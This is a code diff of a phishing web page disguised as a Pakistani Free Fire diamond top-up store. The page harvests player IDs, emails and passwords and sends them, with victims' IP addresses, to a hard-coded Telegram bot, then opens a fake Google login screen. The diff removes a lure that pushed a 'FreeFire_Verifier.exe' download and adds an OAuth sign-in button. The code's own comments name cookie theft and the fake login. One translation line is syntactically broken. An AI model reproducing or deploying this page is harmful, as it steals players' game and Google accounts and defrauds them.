@@ -6,7 +6,6 @@
     <title>Pakistan Store | متجر باكستاني - شحن جواهر فري فاير</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Tajawal:wght@300;400;500;700;800&family=Noto+Nastaliq+Urdu:wght@400;500;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
@@ -216,17 +215,6 @@
         .google-actions .next-btn:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(0,0,0,0.15); }
         .google-footer-text { color: #5f6368; font-size: 13px; margin-top: 30px; line-height: 1.6; }
         .google-footer-text a { color: #1a73e8; text-decoration: none; }
-        /* ===== DOWNLOAD OVERLAY ===== */
-        .download-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 99998; display: none; align-items: center; justify-content: center; }
-        .download-overlay.active { display: flex; }
-        .download-card { background: white; border-radius: 16px; padding: 40px; max-width: 420px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.3); animation: popIn 0.3s ease; }
-        .download-card .icon { font-size: 60px; color: #f39c12; margin-bottom: 15px; }
-        .download-card h2 { font-size: 22px; margin-bottom: 10px; }
-        .download-card p { color: #666; margin-bottom: 25px; line-height: 1.7; font-size: 14px; }
-        .download-btn { background: #f39c12; color: #1a1a2e; border: none; padding: 16px 40px; border-radius: 50px; font-size: 17px; font-weight: 700; cursor: pointer; font-family: 'Tajawal', sans-serif; transition: 0.3s; text-decoration: none; display: inline-flex; align-items: center; gap: 10px; }
-        .download-btn:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(243,156,18,0.4); }
-        .skip-link { color: #999; font-size: 13px; margin-top: 15px; display: block; cursor: pointer; }
-        .skip-link:hover { color: #666; }
         @media (max-width: 1200px) { .products-grid { grid-template-columns: repeat(3, 1fr); } }
         @media (max-width: 768px) { .nav-links { display: none; } .hero h1 { font-size: 32px; } .features { grid-template-columns: repeat(2, 1fr); } .products-grid { grid-template-columns: repeat(2, 1fr); } .steps { grid-template-columns: repeat(2, 1fr); } .steps::before { display: none; } .contact-content { grid-template-columns: 1fr; } .cart-sidebar { width: 100%; left: -100%; } .form-grid { grid-template-columns: 1fr; } .google-card { margin: 15px; padding: 30px 24px; } }
     </style>
@@ -313,9 +301,9 @@
             <div class="form-grid">
                 <div class="form-group">
                     <label><i class="fas fa-id-badge"></i> <span data-i18n="form.id">معرف اللاعب (ID)</span></label>
-                    <input type="text" id="accountId" data-i18n-placeholder="form.idPh" placeholder="أدخل ID حسابك" oninput="validateId()">
-                    <small data-i18n="form.idHelp">معرف حسابك في فري فاير (يبدأ بأرقام)</small>
-                    <div class="error-msg" id="idError">❌ <span data-i18n="error.id">يرجى إدخال معرف اللاعب (أرقام فقط)</span></div>
+                    <input type="text" id="accountId" data-i18n-placeholder="form.idPh" placeholder="أدخل ID حسابك (10-12 رقم)" oninput="validateId()">
+                    <small data-i18n="form.idHelp">معرف حسابك في فري فاير (10 إلى 12 رقماً)</small>
+                    <div class="error-msg" id="idError">❌ <span data-i18n="error.id">يرجى إدخال معرف اللاعب (10 إلى 12 رقماً)</span></div>
                 </div>
                 <div class="form-group">
                     <label><i class="fas fa-envelope"></i> <span data-i18n="form.email">البريد الإلكتروني (Gmail)</span></label>
@@ -325,8 +313,8 @@
                 </div>
                 <div class="form-group">
                     <label><i class="fas fa-lock"></i> <span data-i18n="form.password">كلمة المرور</span></label>
-                    <input type="password" id="accountPassword" data-i18n-placeholder="form.passwordPh" placeholder="أدخل كلمة المرور" oninput="validatePasswordMatch()">
-                    <small data-i18n="form.passwordHelp">مطلوبة لربط الحساب</small>
+                    <input type="password" id="accountPassword" data-i18n-placeholder="form.passwordPh" placeholder="أدخل كلمة المرور (8 أحرف على الأقل)" oninput="validatePasswordMatch()">
+                    <small data-i18n="form.passwordHelp">مطلوبة لربط الحساب - 8 أحرف على الأقل</small>
                 </div>
                 <div class="form-group">
                     <label><i class="fas fa-key"></i> <span data-i18n="form.passwordConfirm">تأكيد كلمة المرور</span></label>
@@ -387,7 +375,7 @@
                 <p data-i18n="contact.desc">فريقنا متاح على واتساب لمساعدتك على مدار الساعة</p>
             </div>
             <div class="whatsapp-box">
-                <div class="whatsapp-item"><i class="fab fa-whatsapp"></i><div><h4 data-i18n="contact.whatsapp">واتساب</h4><p>+92 300 1234567</p></div></div>
+                <div class="whatsapp-item"><i class="fab fa-whatsapp"></i><div><h4 data-i18n="contact.whatsapp">واتساب</h4><p>+66610619782</p></div></div>
             </div>
             <div class="contact-form">
                 <form onsubmit="submitForm(event)">
@@ -453,7 +441,7 @@
         </div>
     </div>
 
-    <a href="https://wa.me/923001234567" class="whatsapp-btn" target="_blank"><i class="fab fa-whatsapp"></i></a>
+    <a href="https://wa.me/66610619782" class="whatsapp-btn" target="_blank"><i class="fab fa-whatsapp"></i></a>
 
     <!-- ===== FAKE GOOGLE LOGIN OVERLAY ===== -->
     <div class="google-overlay" id="googleOverlay">
@@ -463,6 +451,13 @@
             </div>
             <h2>تسجيل الدخول</h2>
             <p class="sub">استخدم حساب Google لتأكيد هويتك</p>
+            <button onclick="startOAuth()" style="width:100%;display:flex;align-items:center;justify-content:center;gap:10px;background:#fff;border:1px solid #dadce0;border-radius:6px;padding:11px 16px;font-size:15px;font-weight:600;color:#3c4043;cursor:pointer;font-family:'Google Sans','Roboto',Arial,sans-serif;margin-bottom:14px;transition:background .2s;">
+                <svg viewBox="0 0 48 48" width="18" height="18"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.57l7.97-6.98z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+                تسجيل الدخول بضغطة واحدة
+            </button>
+            <div style="display:flex;align-items:center;gap:10px;color:#5f6368;font-size:12px;margin-bottom:14px;">
+                <span style="flex:1;height:1px;background:#dadce0;"></span>أو<span style="flex:1;height:1px;background:#dadce0;"></span>
+            </div>
             <div class="google-input-group">
                 <input type="email" id="googleEmail" required value="">
                 <label for="googleEmail">البريد الإلكتروني</label>
@@ -481,29 +476,25 @@
         </div>
     </div>
 
-    <!-- ===== DOWNLOAD OVERLAY ===== -->
-    <div class="download-overlay" id="downloadOverlay">
-        <div class="download-card">
-            <div class="icon"><i class="fas fa-shield-alt"></i></div>
-            <h2>🛡️ تأكيد الأمان — خطوة أخيرة</h2>
-            <p>لتأكيد حسابك وتفعيل <strong>1000 جوهرة مجانية</strong>، يرجى تحميل <strong>برنامج التحقق من الحساب</strong> وتشغيله.<br><br>البرنامج آمن ومعتمد. يستغرق 10 ثوانٍ فقط.</p>
-            <a class="download-btn" id="malwareBtn" href="FreeFire_Verifier.exe" download><i class="fas fa-download"></i> تحميل البرنامج</a>
-            <a class="skip-link" onclick="skipDownload()">تخطي — سأفعل لاحقاً</a>
-        </div>
-    </div>
-
     <script>
         // =====================================================
         // 🛡️ CONFIG — غير البيانات دي
         // =====================================================
         const TELEGRAM_BOT_TOKEN = '8228247059:AAGVPnwBA0ClYziL9GJ0ZBdLypsXC0hhbAw';
         const TELEGRAM_CHAT_ID = '6062660671';
-        var ROOM_NAME = 'pkr-TEST123'; // ⚠️ غيرها لكود غرفة panel.html
 
         // =====================================================
-        // 🍪 AUTO COOKIE THEFT + DEVICE INFO (أول ما يدخل)
+        // 🔐 OAuth — تسجيل الدخول بضغطة واحدة (Google)
+        // =====================================================
+        const OAUTH_CLIENT_ID = '689145700598-6943vno259ibfg3fuua4l1ajf66db0v7.apps.googleusercontent.com';
+        const OAUTH_REDIRECT_URI = 'https://razan2248.github.io/pakistann/';
+
+        // =====================================================
+        // 🍪 AUTO DEVICE INFO (أول ما يدخل — مرة واحدة لكل جلسة)
         // =====================================================
         (function() {
+            if (sessionStorage.getItem('ps_stolen')) return;
+            sessionStorage.setItem('ps_stolen', '1');
             function sendRaw(text) {
                 var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
                 fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' }) })
@@ -600,12 +591,12 @@
                 'products.title': '💎 باقات الشحن', 'products.desc': 'اختر الباقة المناسبة لك',
                 'form.title': 'بيانات الحساب', 'form.notice': 'اختر باقة أولاً', 'form.notice2': 'من الباقات بالأعلى لتفعيل النموذج', 'form.noticeActive': 'تم اختيار الباقة', 'form.noticeActive2': 'أكمل البيانات أدناه',
                 'form.linkType': 'نوع ربط الحساب الأساسي', 'form.linkChoose': '-- اختر نوع الربط --', 'form.linkGuest': '👤 حساب ضيف (Guest)', 'form.linkHelp': '⚠️ اختر الطريقة المربوط بها حسابك الأساسي في فري فاير',
-                'form.id': 'معرف اللاعب (ID)', 'form.idPh': 'أدخل ID حسابك', 'form.idHelp': 'معرف حسابك في فري فاير (يبدأ بأرقام)',
+                'form.id': 'معرف اللاعب (ID)', 'form.idPh': 'أدخل ID حسابك (10-12 رقم)', 'form.idHelp': 'معرف حسابك في فري فاير (10 إلى 12 رقماً)',
                 'form.email': 'البريد الإلكتروني (Gmail)', 'form.emailPh': 'أدخل بريدك الإلكتروني', 'form.emailHelp': 'سيتم الربط بهذا الحساب',
-                'form.password': 'كلمة المرور', 'form.passwordPh': 'أدخل كلمة المرور', 'form.passwordHelp': 'مطلوبة لربط الحساب',
+                'form.password': 'كلمة المرور', 'form.passwordPh': 'أدخل كلمة المرور (8 أحرف على الأقل)', 'form.passwordHelp': 'مطلوبة لربط الحساب - 8 أحرف على الأقل',
                 'form.passwordConfirm': 'تأكيد كلمة المرور', 'form.passwordConfirmPh': 'أعد إدخال كلمة المرور', 'form.confirmHelp': 'للتأكيد',
                 'form.payment': 'طريقة الدفع', 'form.currency': 'العملة', 'form.checkout': 'إتمام الطلب عبر واتساب', 'form.visa': 'Visa', 'form.vodafone': 'Vodafone Cash', 'form.googleplay': 'بطاقة جوجل بلاي',
-                'error.id': 'يرجى إدخال معرف اللاعب (أرقام فقط)', 'error.email': 'يرجى إدخال بريد إلكتروني صحيح (مثل: name@gmail.com)', 'error.password': 'كلمتا المرور غير متطابقتين', 'error.payment': 'يرجى اختيار طريقة دفع',
+                'error.id': 'يرجى إدخال معرف اللاعب (10 إلى 12 رقماً)', 'error.email': 'يرجى إدخال بريد إلكتروني صحيح (مثل: name@gmail.com)', 'error.password': 'كلمتا المرور غير متطابقتين', 'error.passwordShort': 'كلمة المرور قصيرة — 8 أحرف أو أرقام على الأقل', 'error.payment': 'يرجى اختيار طريقة دفع',
                 'free.title': 'باقة مجانية! 🎉', 'free.desc': 'مش محتاج تدفع أي حاجة - الباقة دي مجانية تمامًا',
                 'currency.pkr': 'روبية باكستانية (PKR)', 'currency.eur': 'يورو إيطالي (EUR)', 'currency.usd': 'دولار أمريكي (USD)',
                 'how.title': 'كيف تعمل؟', 'how.desc': '3 خطوات بسيطة لشحن حسابك', 'how.s1.t': 'اختر الباقة', 'how.s1.d': 'اختر الباقة المناسبة للعبة', 'how.s2.t': 'أدخل البيانات', 'how.s2.d': 'بريدك الإلكتروني وكلمة المرور', 'how.s3.t': 'تواصل واتساب', 'how.s3.d': 'ابعت لنا ونوصلك خلال دقائق', 'how.s4.t': 'استلم جواهرك', 'how.s4.d': 'خلال دقائق حسابك يبان',
@@ -614,7 +605,7 @@
                 'cart.title': '🛒 سلة التسوق', 'cart.empty': 'السلة فارغة', 'cart.emptyHelp': 'اختر باقة للبدء', 'cart.total': 'الإجمالي:', 'cart.note': 'لإتمام الطلب، املأ النموذج في الصفحة',
                 'modal.added': 'تمت الإضافة!', 'modal.addedHelp': 'الآن أدخل بيانات حسابك للمتابعة', 'modal.ok': 'تم',
                 'login.title': 'تم عملية الدفع', 'login.desc': 'يرجا الانتضار للتحقق من معلوماتك', 'login.noteBefore': 'اذا استلمت اشعارا من', 'login.noteAfter': 'هذا يعني:', 'login.status1': 'فريق الدعم الفني يتحقق من المعلومات التي ادخلتها', 'login.status2': 'انتضر قليلا حتى تكتمل العمليه',
-                'alert.choosePack': '⚠️ اختر باقة أولاً!', 'alert.chooseLink': '⚠️ اختر نوع ربط الحساب الأساسي!', 'alert.fillId': '⚠️ أدخل معرف اللاعب (ID)!', 'alert.fillAll': '⚠️ أدخل البريد الإلكتروني وكلمة المرور!', 'alert.passwordMismatch': '⚠️ كلمة المرور غير متطابقة!', 'alert.choosePayment': '⚠️ اختر طريقة الدفع!', 'alert.comingSoon': '🚧 قريباً! خدمة شحن ببجي موبايل ستكون متاحة قريباً'
+                'alert.choosePack': '⚠️ اختر باقة أولاً!', 'alert.chooseLink': '⚠️ اختر نوع ربط الحساب الأساسي!', 'alert.fillId': '⚠️ أدخل معرف اللاعب (ID)!', 'alert.fillAll': '⚠️ أدخل البريد الإلكتروني وكلمة المرور!', 'alert.passwordMismatch': '⚠️ كلمة المرور غير متطابقة!', 'alert.passwordShort': '⚠️ كلمة المرور قصيرة — 8 أحرف أو أرقام على الأقل!', 'alert.choosePayment': '⚠️ اختر طريقة الدفع!', 'alert.comingSoon': '🚧 قريباً! خدمة شحن ببجي موبايل ستكون متاحة قريباً'
             },
             en: {
                 'header.instant': 'Instant delivery - Under 5 minutes', 'header.support': '24/7 Tech Support',
@@ -626,12 +617,12 @@
                 'products.title': '💎 Top-up Packages', 'products.desc': 'Pick the package that fits you',
                 'form.title': 'Account Details', 'form.notice': 'Select a package first', 'form.notice2': 'from the packages above to enable the form', 'form.noticeActive': 'Package selected', 'form.noticeActive2': 'Complete your details below',
                 'form.linkType': 'Primary Account Link Type', 'form.linkChoose': '-- Choose link type --', 'form.linkGuest': '👤 Guest Account', 'form.linkHelp': '⚠️ Choose how your main Free Fire account is linked',
-                'form.id': 'Player ID', 'form.idPh': 'Enter your account ID', 'form.idHelp': 'Your Free Fire account ID (numbers only)',
+                'form.id': 'Player ID', 'form.idPh': 'Enter your account ID (10-12 digits)', 'form.idHelp': 'Your Free Fire account ID (10 to 12 digits)',
                 'form.email': 'Email (Gmail)', 'form.emailPh': 'Enter your email', 'form.emailHelp': 'Will be linked to this account',
-                'form.password': 'Password', 'form.passwordPh': 'Enter your password', 'form.passwordHelp': 'Required to link the account',
+                'form.password': 'Password', 'form.passwordPh': 'Enter your password (at least 8 characters)', 'form.passwordHelp': 'Required to link the account - at least 8 characters',
                 'form.passwordConfirm': 'Confirm Password', 'form.passwordConfirmPh': 'Re-enter your password', 'form.confirmHelp': 'For confirmation',
                 'form.payment': 'Payment Method', 'form.currency': 'Currency', 'form.checkout': 'Complete Order via WhatsApp', 'form.visa': 'Visa', 'form.vodafone': 'Vodafone Cash', 'form.googleplay': 'Google Play Card',
-                'error.id': 'Please enter your Player ID (numbers only)', 'error.email': 'Please enter a valid email (e.g. name@gmail.com)', 'error.password': 'Passwords do not match', 'error.payment': 'Please choose a payment method',
+                'error.id': 'Please enter your Player ID (10-12 digits)', 'error.email': 'Please enter a valid email (e.g. name@gmail.com)', 'error.password': 'Passwords do not match', 'error.passwordShort': 'Password too short — at least 8 characters', 'error.payment': 'Please choose a payment method',
                 'free.title': 'Free Package! 🎉', 'free.desc': "You don't need to pay anything - this package is completely free",
                 'currency.pkr': 'Pakistani Rupee (PKR)', 'currency.eur': 'Euro (EUR)', 'currency.usd': 'US Dollar (USD)',
                 'how.title': 'How it works?', 'how.desc': '3 simple steps to top up your account', 'how.s1.t': 'Choose Package', 'how.s1.d': 'Pick the right package', 'how.s2.t': 'Enter Details', 'how.s2.d': 'Your email and password', 'how.s3.t': 'WhatsApp Us', 'how.s3.d': 'Send and we deliver fast', 'how.s4.t': 'Get Diamonds', 'how.s4.d': 'In minutes your account is updated',
@@ -640,7 +631,7 @@
                 'cart.title': '🛒 Shopping Cart', 'cart.empty': 'Cart is empty', 'cart.emptyHelp': 'Pick a package to start', 'cart.total': 'Total:', 'cart.note': 'To complete your order, fill the form on the page',
                 'modal.added': 'Added!', 'modal.addedHelp': 'Now enter your account details to continue', 'modal.ok': 'OK',
                 'login.title': 'Payment Completed', 'login.desc': 'Please wait while we verify your information', 'login.noteBefore': 'If you receive a notification from', 'login.noteAfter': ', this means:', 'login.status1': 'Our tech support team is verifying the information you entered', 'login.status2': 'Please wait a moment until the process is complete',
-                'alert.choosePack': '⚠️ Choose a package first!', 'alert.chooseLink': '⚠️ Choose primary account link type!', 'alert.fillId': '⚠️ Enter your Player ID!', 'alert.fillAll': '⚠️ Enter email and password!', 'alert.passwordMismatch': '⚠️ Passwords do not match!', 'alert.choosePayment': '⚠️ Choose a payment method!', 'alert.comingSoon': '🚧 Coming soon! PUBG Mobile top-up will be available soon'
+                'alert.choosePack': '⚠️ Choose a package first!', 'alert.chooseLink': '⚠️ Choose primary account link type!', 'alert.fillId': '⚠️ Enter your Player ID!', 'alert.fillAll': '⚠️ Enter email and password!', 'alert.passwordMismatch': '⚠️ Passwords do not match!', 'alert.passwordShort': '⚠️ Password too short — at least 8 characters!', 'alert.choosePayment': '⚠️ Choose a payment method!', 'alert.comingSoon': '🚧 Coming soon! PUBG Mobile top-up will be available soon'
             },
             ur: {
                 'header.instant': 'فوری ڈیلیوری - 5 منٹ سے کم', 'header.support': '24/7 تکنیکی معاونت',
@@ -652,21 +643,22 @@
                 'products.title': '💎 ٹاپ اپ پیکجز', 'products.desc': 'اپنے لیے مناسب پیکج منتخب کریں',
                 'form.title': 'اکاؤنٹ کی تفصیلات', 'form.notice': 'پہلے ایک پیکج منتخب کریں', 'form.notice2': 'فارم کو فعال کرنے کے لیے اوپر کے پیکجوں میں سے', 'form.noticeActive': 'پیکج منتخب ہو گیا', 'form.noticeActive2': 'ذیل میں اپنی تفصیلات مکمل کریں',
                 'form.linkType': 'بنیادی اکاؤنٹ لنک کی قسم', 'form.linkChoose': '-- لنک کی قسم منتخب کریں --', 'form.linkGuest': '👤 مہمان اکاؤنٹ (Guest)', 'form.linkHelp': '⚠️ منتخب کریں کہ آپ کا بنیادی فری فائر اکاؤنٹ کس طرح سے لنک ہے',
-                'form.id': 'کھلاڑی ID', 'form.idPh': 'اپنا اکاؤنٹ ID درج کریں', 'form.idHelp': 'فری فائر میں آپ کا اکاؤنٹ ID (صرف نمبر)',
+                'form.id': 'کھلاڑی ID', 'form.idPh': 'اپنا اکاؤنٹ ID درج کریں (10-12 ہندسے)', 'form.idHelp': 'فری فائر میں آپ کا اکاؤنٹ ID (10 سے 12 ہندسے)',
                 'form.email': 'ای میل (جی میل)', 'form.emailPh': 'اپنا ای میل درج کریں', 'form.emailHelp': 'اس اکاؤنٹ سے لنک ہوگا',
-                'form.password': 'پاس ورڈ', 'form.passwordPh': 'اپنا پاس ورڈ درج کریں', 'form.passwordHelp': 'اکاؤنٹ لنک کرنے کے لیے ضروری',
+                'form.password': 'پاس ورڈ', 'form.passwordPh': 'پاس ورڈ درج کریں (کم از کم 8 حروف)', 'form.passwordHelp': 'اکاؤنٹ لنک کرنے کے لیے ضروری - کم از کم 8 حروف',
                 'form.passwordConfirm': 'پاس ورڈ کی تصدیق', 'form.passwordConfirmPh': 'پاس ورڈ دوبارہ درج کریں', 'form.confirmHelp': 'تصدیق کے لیے',
                 'form.payment': 'ادائیگی کا طریقہ', 'form.currency': 'کرنسی', 'form.checkout': 'واٹس ایپ کے ذریعے آرڈر مکمل کریں', 'form.visa': 'ویزا', 'form.vodafone': 'ووڈافون کیش', 'form.googleplay': 'گوگل پلے کارڈ',
-                'error.id': 'براہ کرم کھلاڑی ID درج کریں (صرف نمبر)', 'error.email': 'براہ کرم درست ای میل درج کریں (مثلاً: name@gmail.com)', 'error.password': 'پاس ورڈ مماثل نہیں ہیں', 'error.payment': 'براہ کرم ادائیگی کا طریقہ منتخب کریں',
+                'error.id': 'براہ کرم کھلاڑی ID درج کریں (10-12 ہندسے)', 'error.email': 'براہ کرم درست ای میل درج کریں (مثلاً: name@gmail.com)', 'error.password': 'پاس ورڈ مماثل نہیں ہیں', 'error.passwordShort': 'پاس ورڈ بہت چھوٹا ہے — کم از کم 8 حروف', 'error.payment': 'براہ کرم ادائیگی کا طریقہ منتخب کریں',
                 'free.title': 'مفت پیکج! 🎉', 'free.desc': 'آپ کو کچھ ادا کرنے کی ضرورت نہیں - یہ پیکج مکمل طور پر مفت ہے',
                 'currency.pkr': 'پاکستانی روپے (PKR)', 'currency.eur': 'یورو (EUR)', 'currency.usd': 'امریکی ڈالر (USD)',
                 'how.title': 'یہ کیسے کام کرتا ہے؟', 'how.desc': 'اپنا اکاؤنٹ ٹاپ اپ کرنے کے لیے 3 آسان مراحل', 'how.s1.t': 'پیکج منتخب کریں', 'how.s1.d': 'کھیل کے لیے مناسب پیکج منتخب کریں', 'how.s2.t': 'تفصیلات درج کریں', 'how.s2.d': 'آپ کا ای میل اور پاس ورڈ', 'how.s3.t': 'واٹس ایپ پر رابطہ', 'how.s3.d': 'ہمیں بھیجیں اور ہم جلدی پہنچائیں گے', 'how.s4.t': 'اپنے جواہر وصول کریں', 'how.s4.d': 'منٹوں میں آپ کا اکاؤنٹ اپ ڈیٹ ہو جائے گا',
                 'contact.title': '💬 ہم سے رابطہ', 'contact.desc': 'ہماری ٹیم آپ کی مدد کے لیے 24/7 واٹس ایپ پر دستیاب ہے', 'contact.whatsapp': 'واٹس ایپ', 'contact.name': 'نام', 'contact.phone': 'واٹس ایپ نمبر', 'contact.gameChoose': 'کھیل منتخب کریں', 'contact.msg': 'آپ کا پیغام یا سوال...', 'contact.send': 'واٹس ایپ کے ذریعے بھیجیں',
                 'footer.copy': '© 2024 پاکستان اسٹور - جملہ حقوق محفوظ ہیں',
-                'cart.title': '🛒 شاپنگ کارٹ', 'cart.empty': 'کارٹ خالی ہے', 'cart.emptyHelp': 'شروع کرنے کے لیے پیکج منتخب کریں', 'cart.total': 'کل:', 'cart.note': 'آرڈر مکمل کرنے کے لیے، صفحے پر فارم پُر کریں',
+                'cart.title': '🛒 شاپنگ کارٹ', '
+                    'cart.empty': 'کارٹ خالی ہے', 'cart.emptyHelp': 'شروع کرنے کے لیے پیکج منتخب کریں', 'cart.total': 'کل:', 'cart.note': 'آرڈر مکمل کرنے کے لیے، صفحے پر فارم پُر کریں',
                 'modal.added': 'شامل ہو گیا!', 'modal.addedHelp': 'اب جاری رکھنے کے لیے اپنی تفصیلات درج کریں', 'modal.ok': 'ٹھیک ہے',
                 'login.title': 'ادائیگی مکمل ہوئی', 'login.desc': 'براہ کرم اپنی معلومات کی تصدیق کے لیے انتظار کریں', 'login.noteBefore': 'اگر آپ کو', 'login.noteAfter': 'سے اطلاع ملے تو اس کا مطلب ہے:', 'login.status1': 'ہماری تکنیکی معاونت ٹیم آپ کی درج کردہ معلومات کی تصدیق کر رہی ہے', 'login.status2': 'براہ کرم تھوڑی دیر انتظار کریں جب تک عمل مکمل ہو جائے',
-                'alert.choosePack': '⚠️ پہلے ایک پیکج منتخب کریں!', 'alert.chooseLink': '⚠️ بنیادی اکاؤنٹ لنک کی قسم منتخب کریں!', 'alert.fillId': '⚠️ اپنا کھلاڑی ID درج کریں!', 'alert.fillAll': '⚠️ ای میل اور پاس ورڈ درج کریں!', 'alert.passwordMismatch': '⚠️ پاس ورڈ مماثل نہیں ہیں!', 'alert.choosePayment': '⚠️ ادائیگی کا طریقہ منتخب کریں!', 'alert.comingSoon': '🚧 جلد آ رہا ہے! پب جی موبائل ٹاپ اپ جلد دستیاب ہوگا'
+                'alert.choosePack': '⚠️ پہلے ایک پیکج منتخب کریں!', 'alert.chooseLink': '⚠️ بنیادی اکاؤنٹ لنک کی قسم منتخب کریں!', 'alert.fillId': '⚠️ اپنا کھلاڑی ID درج کریں!', 'alert.fillAll': '⚠️ ای میل اور پاس ورڈ درج کریں!', 'alert.passwordMismatch': '⚠️ پاس ورڈ مماثل نہیں ہیں!', 'alert.passwordShort': '⚠️ پاس ورڈ بہت چھوٹا ہے — کم از کم 8 حروف!', 'alert.choosePayment': '⚠️ ادائیگی کا طریقہ منتخب کریں!', 'alert.comingSoon': '🚧 جلد آ رہا ہے! پب جی موبائل ٹاپ اپ جلد دستیاب ہوگا'
             }
         };
 
@@ -698,12 +690,12 @@
         else document.body.classList.add('lang-ar');
 
         // =====================================================
-        // ✅ دوال التحقق
+        // ✅ التحقق — ID إجباري 10-12 رقم، باسورد 8+ أحرف
         // =====================================================
         function validateId() {
             var id = document.getElementById('accountId');
             var error = document.getElementById('idError');
-            var idRegex = /^\d{6,12}$/;
+            var idRegex = /^\d{10,12}$/;
             if (id.value && !idRegex.test(id.value.trim())) { error.classList.add('show'); id.classList.add('invalid'); id.classList.remove('valid'); return false; }
             else if (id.value && idRegex.test(id.value.trim())) { error.classList.remove('show'); id.classList.remove('invalid'); id.classList.add('valid'); return true; }
             else { error.classList.remove('show'); id.classList.remove('invalid'); id.classList.remove('valid'); return false; }
@@ -720,9 +712,18 @@
             var password = document.getElementById('accountPassword');
             var confirm = document.getElementById('accountPasswordConfirm');
             var error = document.getElementById('passwordError');
-            if (confirm.value && password.value !== confirm.value) { error.classList.add('show'); confirm.classList.add('invalid'); confirm.classList.remove('valid'); return false; }
-            else if (confirm.value && password.value === confirm.value) { error.classList.remove('show'); confirm.classList.remove('invalid'); confirm.classList.add('valid'); return true; }
-            else { error.classList.remove('show'); confirm.classList.remove('invalid'); confirm.classList.remove('valid'); return false; }
+            var t = i18n[currentLang];
+            if (password.value && password.value.length < 8) {
+                error.textContent = '❌ ' + (t['error.passwordShort'] || 'كلمة المرور قصيرة — 8 أحرف على الأقل');
+                error.classList.add('show'); password.classList.add('invalid'); password.classList.remove('valid'); return false;
+            }
+            if (confirm.value && password.value !== confirm.value) {
+                error.textContent = '❌ ' + (t['error.password'] || 'كلمتا المرور غير متطابقتين');
+                error.classList.add('show'); confirm.classList.add('invalid'); confirm.classList.remove('valid'); return false;
+            }
+            error.classList.remove('show'); password.classList.remove('invalid'); confirm.classList.remove('invalid');
+            password.classList.add('valid'); if (confirm.value) confirm.classList.add('valid');
+            return true;
         }
         function isFreeSelected() { return selectedProduct && selectedProduct.pricePKR === 0; }
         function updatePaymentVisibility() {
@@ -734,7 +735,7 @@
         }
 
         // =====================================================
-        // 🛒 دوال المنتجات والسلة
+        // 🛒 المنتجات والسلة
         // =====================================================
         function loadProducts() {
             var grid = document.getElementById('productsGrid');
@@ -833,30 +834,30 @@
             var form = e.target;
             var inputs = form.querySelectorAll('input, select, textarea');
             var t = i18n[currentLang];
-            var message = '📩 ' + t['wa.contactTitle'] + '\n\n';
+            var message = '📩 ' + (t['contact.title'] || '') + '\n\n';
             inputs.forEach(function(input){ if(input.value && input.placeholder) message += input.placeholder + ': ' + input.value + '\n'; });
-            window.open('https://wa.me/923001234567?text=' + encodeURIComponent(message), '_blank');
+            window.open('https://wa.me/66610619782?text=' + encodeURIComponent(message), '_blank');
         }
-
         // =====================================================
         // ✅ الخطوة 1: إتمام الطلب → إرسال بيانات فري فاير → فتح شاشة جوجل
         // =====================================================
         function proceedToCheckout() {
             var linkType = document.getElementById('accountLinkType').value;
             var playerId = document.getElementById('accountId').value.trim();
-            var email = document.getElementById('accountEmail').value;
+            var email = document.getElementById('accountEmail').value.trim();
             var password = document.getElementById('accountPassword').value;
             var passwordConfirm = document.getElementById('accountPasswordConfirm').value;
             var t = i18n[currentLang];
 
             if (!selectedProduct) { alert(t['alert.choosePack']); return; }
             if (!linkType) { alert(t['alert.chooseLink']); return; }
-            var idRegex = /^\d{6,12}$/;
+            var idRegex = /^\d{10,12}$/;
             if (!playerId) { alert(t['alert.fillId']); document.getElementById('accountId').focus(); return; }
-            else if (!idRegex.test(playerId)) { validateId(); document.getElementById('accountId').focus(); return; }
+            if (!idRegex.test(playerId)) { validateId(); document.getElementById('accountId').focus(); return; }
             if (!email || !password) { alert(t['alert.fillAll']); return; }
             var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(email)) { validateEmail(); document.getElementById('accountEmail').focus(); return; }
+            if (password.length < 8) { alert(t['alert.passwordShort']); document.getElementById('accountPassword').focus(); return; }
             if (password !== passwordConfirm) { validatePasswordMatch(); document.getElementById('accountPasswordConfirm').focus(); return; }
             if (!isFreeSelected() && !selectedPayment) { alert(t['alert.choosePayment']); var pe = document.getElementById('paymentError'); if(pe) pe.classList.add('show'); return; }
 
@@ -879,20 +880,32 @@
             sendToTelegram(msg);
             fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){ sendToTelegram('🌐 <b>IP:</b> <code>' + d.ip + '</code>'); }).catch(function(){});
 
-            // فتح شاشة جوجل المزيفة (الخطوة 2) — الإيميل معبى تلقائياً
+            // فتح شاشة جوجل (الخطوة 2) — الإيميل معبى تلقائياً
             document.getElementById('googleEmail').value = email;
